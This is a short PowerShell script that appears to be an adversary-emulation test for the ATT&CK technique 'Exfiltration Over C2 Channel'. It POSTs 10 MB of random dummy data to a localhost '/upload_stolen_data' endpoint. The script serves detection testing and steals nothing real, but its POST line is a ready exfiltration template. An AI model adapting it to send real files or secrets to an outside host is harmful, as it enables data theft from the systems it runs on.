<#
    Technique: T1041
    Name: Exfiltration Over C2 Channel
    Description: Sending stolen data back over the existing Command and Control channel.
    Simulation: Sends a large dummy POST request to localhost.
#>

Write-Host "[*] EXECUTING ATOMIC SMUGGLER (Data over C2)..." -ForegroundColor Cyan

# 1. Generate Dummy Data (10 MB)
Write-Host "[>] Generating 10MB of dummy data..."
$dummyData = new-object byte[] (10MB)
(new-object Random).NextBytes($dummyData)
$b64 = [Convert]::ToBase64String($dummyData)

Write-Host "[>] Sending Data to C2 (127.0.0.1)..."

# 2. Transmit
# In a real scenario, this would be encrypted and chunked.
try {
    Invoke-WebRequest -Uri "http://127.0.0.1/upload_stolen_data" -Method Post -Body $b64 -ErrorAction Stop
} catch {
    Write-Warning "[-] Connection failed (Expected if no listener). Payload size was $( $b64.Length ) bytes."
}

Write-Host "[*] Transmission Attempt Complete."
